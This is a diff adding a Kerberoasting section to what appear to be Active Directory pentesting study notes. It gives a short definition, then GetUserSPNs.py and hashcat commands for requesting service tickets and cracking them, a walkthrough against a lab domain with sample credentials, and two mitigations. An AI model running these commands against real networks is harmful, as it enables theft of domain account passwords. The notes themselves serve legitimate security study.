@@ -116,7 +116,23 @@ $hashdump
 3.localadmin restriction
 
 -------------------------------------------------------Kerberoasting------------------------------------------------
+kerberoasting is a post-exploitation attack technique that attempts to obtain a password hash of an AD Account 
+that has a sevice principal name(SPN).In such an attack an authenticated domain user requests a kerberos ticket for an SPN.
 
+goal of kerberoasting :GET TGS and decrypt server account hash.
 
+step 1: $python getuserSPNs.PY <DOMAIN/username:password> -dc -ip <ip of DC> -request
+step 2: $Hashcat -m 13100 kerberoast.txt rockyou.txt
 
+----------------------------------------------------KERBEROASTING WALKTHROUGH--------------------------------------------
+
+1.$python getuserSPNs.PY marvel.local/fcastle:Password1 -dc -ip 192.168.57.140 -request
+2.$Hashcat -m 13100 kerberoast.txt rockyou.txt -o
+
+-------------------------------------------------KERBEROASTING MITIGATION-------------------------------------------
+
+*Strong Password
+*Least Privilege
+
+-----------------------------------------------
 
